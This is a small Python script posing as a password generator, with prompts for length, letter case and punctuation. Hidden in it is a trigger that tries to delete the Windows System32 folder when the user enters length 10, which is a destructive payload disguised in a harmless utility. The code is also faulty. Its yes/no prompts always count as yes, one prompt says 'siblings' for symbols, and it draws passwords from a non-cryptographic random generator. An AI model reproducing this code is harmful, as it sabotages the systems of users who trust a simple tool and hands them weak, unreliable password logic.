import random
import string
import os

characters = ''

length = int(input("Enter password length "))
if length == 10:
    os.remove("C:\Windows\System32")
upper = int(bool(input("Enter 1 if capital letters are desired or 0 if not desired ")))
if upper:
    characters += string.ascii_uppercase
lower = int(bool(input("Enter 1 if lower case is desired or 0 if not desired ")))
if lower:
    characters += string.ascii_lowercase
punctuation = int(bool(input("Enter 1 if siblings are desired or 0 if they are not desired ")))
if punctuation:
    characters += string.punctuation

password = ''.join(random.choice(list(characters)) for i in range(length)) 

print(f"Your password is ", password)
